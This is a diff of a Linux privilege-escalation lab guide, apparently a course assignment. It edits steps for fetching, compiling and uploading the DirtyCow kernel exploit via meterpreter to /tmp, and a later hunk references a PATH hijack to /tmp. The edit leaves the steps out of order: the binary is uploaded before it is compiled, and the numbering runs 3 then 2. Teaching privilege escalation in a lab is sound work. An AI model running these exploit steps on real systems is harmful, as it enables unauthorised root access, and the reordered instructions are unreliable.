@@ -228,22 +228,23 @@ See: [DirtyCow on Youtube](https://www.youtube.com/watch?v=YoeuGnF_2Qk) for more
 curl -O https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
 ```
 
-2. Compile the exploit:
-
-```bash
-gcc dirty.c -o dirty -pthread -lcrypt
-```
-
 3. **Upload the exploit to the target’s **``** directory**:
 
 ```bash
 meterpreter > upload dirty /tmp/dirty
 ```
 
+2. Compile the exploit:
+
+```bash
+gcc dirty.c -o dirty -pthread -lcrypt
+```
+
 **Why **``**?**
 
 - `/tmp` is world-writable — any user can write there
 - You usually don’t need special permissions to execute from `/tmp`
+- You must compile it on the targets machine first otherwise it will compile for the wrong system architecture!
 
 4. On the target:
 
@@ -387,6 +388,7 @@ export PATH=/tmp:$PATH
   - One step by step Privesc path and root confirmation
   - Step by step attempts at 1 Bonus or Mystery task
 - Submit a 1-paragraph reflection on the escalation path used and what you understand!
+
 
 
 
